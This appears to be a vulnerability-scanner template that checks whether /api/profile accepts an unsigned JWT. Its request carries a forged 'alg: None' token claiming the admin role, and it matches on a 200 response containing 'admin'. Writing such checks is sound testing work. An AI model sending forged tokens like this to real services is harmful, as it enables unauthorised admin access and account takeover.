id: jwt2-14
name: 'JWT None kid key-113'
severity: critical
type: active
tags:
  - jwt
  - auth
  - none
description: 'Unsigned token accepted on /api/profile'
requests:
  - method: GET
    path: '{{BaseURL}}/api/profile'
    match-all: true
    sendHeaders:
      Authorization: 'Bearer eyJhbGciOiJOb25lIiwidHlwIjoiSldUIiwia2lkIjoia2V5LTExMyJ9.eyJzdWIiOiJ1MTMiLCJyb2xlIjoiYWRtaW4ifQ.'
    matchers:
      - type: status
        status: [200]
      - type: word
        part: body
        words:
          - 'admin'
